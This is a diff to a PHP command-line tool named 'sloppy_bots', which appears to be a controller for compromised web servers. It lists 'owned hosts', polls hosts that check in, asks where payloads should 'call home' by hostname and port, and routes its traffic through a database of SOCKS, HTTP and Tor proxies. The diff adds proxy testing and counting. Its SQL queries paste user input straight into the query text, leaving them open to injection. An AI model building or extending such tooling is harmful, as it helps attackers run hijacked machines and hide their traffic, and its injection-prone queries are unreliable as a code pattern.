@@ -1,4 +1,7 @@
 <?php
+$proxy_set = null;
+$proxy_target = null;
+$proxy_schema = null;
 define("CHH", curl_init());
 if (strtolower(php_uname()) == "windows") {
     define('clears', 'cls');
@@ -63,14 +66,16 @@ if (config['sloppy_proxies']['proxy_init'] !== true){
 }
 
 
-function grab_proxy(string $schema, string $target_domain){
-    if (!empty($schema) && !empty($target_domain)){
-        logo('proxied', clears, false, "Grabbed proxy with {$schema}!".PHP_EOL, $target_domain);
+
+function grab_proxy(string $action, string $target_domain, bool $randomize){
+
+    if ($action === "test" && !empty($target_domain)){
+        $fetched = "SELECT proxy_schema,proxy from sloppy_bots_proxies WHERE last_domain_contacted NOT LIKE '%".$target_domain."%'";
+        print(print_r(pg_fetch_all(pg_exec(pg_connect(DBCONN), $fetched))).PHP_EOL);
     }else{
         logo('proxied', clears, true, "The Required information was empty.".PHP_EOL, $target_domain);
     }
 }
-
 function logo($last, $cl, bool $error, $error_value, string $lastHost)
 {
     if ($last === "q") {
@@ -150,7 +155,7 @@ function update_proxy_db_entries(string $proxy, bool $succssful, string $last_co
                 (int)$tg[0] + 1,
                 $last_contact,
                 $round_trip_time ? $round_trip_time : 0,
-                $time_out ? (int)$tg[1] + 1 : 0,
+                $time_out ? (int)$tg[1] + 1 : (int)$tg[1] - 1,
                 $succssful ? (int)$tg[2] + 1 : (int)$tg[2] - 1,
                 $proxy
             ));
@@ -706,9 +711,18 @@ function awesomeMenu(string $what)
             echo "\n\n" . str_repeat("+", 35) . "[ END OWNED HOSTS ]" . str_repeat("+", 35) . "\n\n";
             break;
         case "proxies":
+            $count_array = array(
+                "socks4" => "SELECT COUNT(*) FROM (SELECT proxy from sloppy_bots_proxies WHERE proxy_schema = 'socks4') AS TEMP",
+                "http" => "SELECT COUNT(*) FROM (SELECT proxy from sloppy_bots_proxies WHERE proxy_schema = 'http') AS TEMP",
+                "https" => "SELECT COUNT(*) FROM (SELECT proxy from sloppy_bots_proxies WHERE proxy_schema = 'https') AS TEMP",
+                "socks5" => "SELECT COUNT(*) FROM (SELECT proxy from sloppy_bots_proxies WHERE proxy_schema = 'socks5') AS TEMP"
+            );
             $schema = trim(readline('[ !! ] Which schema?(socks4/socks5/http)->'));
             if (!empty($schema)){
-                $schema_to_use = sprintf("SELECT * FROM sloppy_bots_proxies WHERE proxy_schema = '%s' LIMIT %s", $schema, trim(readline("Limit(there are a ton in the db.)?")));
+                $schema_to_use = sprintf("SELECT * FROM sloppy_bots_proxies WHERE proxy_schema = '%s' ORDER BY times_used DESC LIMIT %s", $schema, trim(readline("Limit(there are a ton in the db.)?")));
+                $count = pg_exec(pg_connect(DBCONN), $count_array[$schema]);
+                $final = pg_fetch_row($count);
+                print(sprintf("There are currently: %s number of proxies under the %s schema in the database".PHP_EOL, $final[0] , $schema));
             }else{
                 echo "Schema was empty, defaulting to socks4, with a limit of 10";
                 $schema_to_use = "SELECT * FROM sloppy_bots_proxies WHERE proxy_schema = 'socks4' LIMIT 10";
@@ -770,7 +784,7 @@ function awesomeMenu(string $what)
 function check($host, $path, $batch, $proxy)
 {
     if ($batch === "y") {
-        logo('co',clears,false, '','');
+        logo('ch',clears,false, '','batch request');
         $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
         $rows = pg_fetch_all(pg_exec(pg_connect(DBCONN), "SELECT check_in,rhost,uri FROM sloppy_bots_main WHERE rhost IS NOT NULL"));
         echo "Pulling: " . pg_fetch_result($count, null, null) . "\nThis could take awhile.";
@@ -913,7 +927,6 @@ $curlopt_proxy_types = array(
     "tor" => CURLPROXY_SOCKS4
 );
 
-$rotate_proxy = null;
 
 switch (strtolower(readline("Would you like to configure the proxies?(y/n/tor)"))){
     case "y":
@@ -1059,6 +1072,10 @@ while ($run) {
             break;
         case "cr":
             system(clears);
+            $h_name = null;
+            $h_port = null;
+            $d_int = null;
+            $osb = null;
             echo("Where are we calling home to? (hostname/ip)->");
             $h_name = trim(fgets(STDIN));
             echo("Which port are we calling home on?");
@@ -1172,7 +1189,8 @@ while ($run) {
             opts($proxy_set);
             break;
         case "gp":
-            grab_proxy(readline("Schema Please->"), 'http://localhost:8099/slop.php');
+            $p_judge = trim(readline('Proxy judge?(schema://domain:port/ or blank for none.)-> '));
+            grab_proxy(readline("What are we doing?(test/confirm)->"), empty($p_judge) ? "https://icanhazip.com" : $p_judge, is_null($rotate_proxy) ? false : $rotate_proxy);
             break;
         default:
             logo($lc, clears, "", "", '');
